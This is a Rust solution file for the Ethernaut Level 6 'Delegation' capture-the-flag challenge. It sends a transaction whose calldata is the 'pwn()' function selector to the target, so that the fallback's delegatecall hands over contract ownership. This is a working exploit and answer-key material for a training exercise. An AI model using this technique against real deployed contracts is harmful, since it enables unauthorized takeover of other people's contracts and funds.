use async_trait::async_trait;
use ctf::ethernaut::lvl06_delegate::*;
use ethers::{prelude::*, providers::Middleware, utils::keccak256};

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    /**
     * @title Ethernaut Level 6: Delegation
     *
     * The goal of this level is for you to claim
     * ownership of the instance you are given.
     *
     * Things that might help
     * - Look into Solidity's documentation on the
     *   delegatecall low level function, how it works,
     *   how it can be used to delegate operations to
     *   on-chain libraries, and what implications it
     *   has on execution scope.
     * - Fallback methods
     * - Method ids
     */
    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let tx = TransactionRequest::new()
            .to(target.delegation_address)
            .gas(U256::from(10_000_000))
            .data(keccak256("pwn()").into_iter().take(4).collect::<Vec<u8>>());

        offender.send_transaction(tx, None).await?.await?;

        Ok(())
    }
}
